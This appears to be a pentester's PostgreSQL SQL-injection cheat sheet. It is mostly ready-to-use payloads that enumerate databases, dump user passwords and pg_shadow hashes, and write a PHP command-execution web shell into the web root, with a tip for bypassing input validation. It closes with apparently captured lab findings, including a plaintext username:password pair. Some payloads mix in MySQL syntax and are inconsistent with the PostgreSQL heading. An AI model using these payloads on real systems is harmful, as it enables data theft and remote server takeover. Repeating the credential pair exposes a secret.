# PostgreSQL

## Methodology

See [0 SQL Injection](0%20SQL%20Injection.md) for identification if necessary

### Error-based Payloads vs Authentication Queries

We can first attempt to dump information in an error response. This is particularly useful against authentication against authenticaton queries as a valid/invalid response will not display table information.

```mysql
# We can first attempt to view version information inside the error response
' OR 1=1 in (SELECT version()) -- //
'
# We can now attempt to dump table information
' OR 1=1 in (SELECT * FROM users) -- //
'
# In the case where we can only query one column at a time
' OR 1=1 in (SELECT password FROM users) -- //
'
# We can now specify a user to dump the password for
' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //
```

Refer to [pentestmonkey](https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet) for additional example queries

### UNION-based/Error-based payloads vs Search Queries

We can use `ORDER BY` and `UNION SELECT` in a search field to visualize and enumerate a database with many columns.

**Note** PostgreSQL differs from MySQL in `UNION SELECT` statements due to having to match the variable types within the statement. We can aid in matching types by casting with `::` after the character

```mysql
# We first use ORDER BY and increment until we receive an error
' ORDER BY 1 -- //
' ORDER BY 1,2 -- //
' ORDER BY 1,2,3 -- //
' ORDER BY 1,2,3,4 -- //
' ORDER BY 1,2,3,4,5 -- //
' ORDER BY 1,2,3,4,5,6 -- //
# We now get the error "Unknown column '6' in 'order clause'" so we know the database has 6 columns

# We can now check to see which values are being returned by providing each column with an identifier that we can quickly index and check for in the response
' UNION SELECT 'Col1', 'Col2', 'Col3', 'Col4', 'Col5', 'Col6' -- //
'
# We can now rearange our statement to first query baseline information
' UNION SELECT null, current_database(), user, version(), null -- //
' UNION SELECT null, CAST(current_database() as integer), null, null, null -- //
' UNION SELECT null, CAST(passwd as integer), null, null, null, null FROM pg_shadow -- //
'
# Now we can query all databases available for us to enumerate (note: information_schema is default)
' UNION SELECT null, datname, null, null, null FROM pg_database -- //
' UNION SELECT null, CAST((SELECT datname FROM pg_database) as integer), null, null, null -- //
# In the case where we have to limit output due to not allowing more than one row to be returned (increment offset)
' UNION SELECT null, CAST((SELECT datname FROM pg_database LIMIT 1 OFFSET 0) as integer), null, null, null -- //
'
# We can now query tables for our desired databases
' UNION SELECT null, table_name, null, null, null FROM information_schema.tables WHERE table_schema='db_name' -- //
' UNION SELECT null, CAST((SELECT table_name FROM information_schema.tables WHERE table_schema='db_name') as integer), null, null, null -- //

# We can now query columns for our desired table
' UNION SELECT null, column_name, null, null, null FROM information_schema.columns WHERE table_schema='db_name' -- //
' UNION SELECT null, CAST((SELECT column_name FROM information_schema.columns WHERE table_schema='db_name' LIMIT 1 OFFSET 0) as integer), null, null, null -- //

# We now have all the information we need to query table data
' UNION SELECT null, username, password, description, null FROM users -- //
' UNION SELECT null, username, password, description, null FROM users WHERE username='admin' -- //

# We can also leak variables within error data via CAST()
' UNION SELECT null, CAST(version() as integer), null, null, null -- //
' UNION SELECT null, CAST((SELECT * FROM users) as integer), null, null, null -- //
# Miscellaneous functions: current_database(), current_schema(), current_schemas(boolean), current_user, session_user, user, version() - https://www.postgresql.org/docs/7.3/functions-misc.html

# RCE (doesn't matter if PHP code is in viewable column)
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/shell.php" -- //
'; COPY (SELECT '<?php system($_GET[''cmd'']);?>') TO '/var/www/html/shell.php' -- //
```

**Note:** We can also add a `%` before the single quote to bypass input validation

### Boolean-Based Blind SQL Injection

Used in the case where database responses are never returned and behavior is inferred using either boolean or time-based logic.

```mysql
# Time based identification (value before ' must be exist for sleep to succeed, allowing us to identify existing values)
' AND IF (1=1, sleep(2),'false') -- //
```

Current user: rubben
Database: postgres | template1 | template0 | glovedb
Table: public

Columns: active | weight | height | gender | email | created_at

rubben:avrillavigne
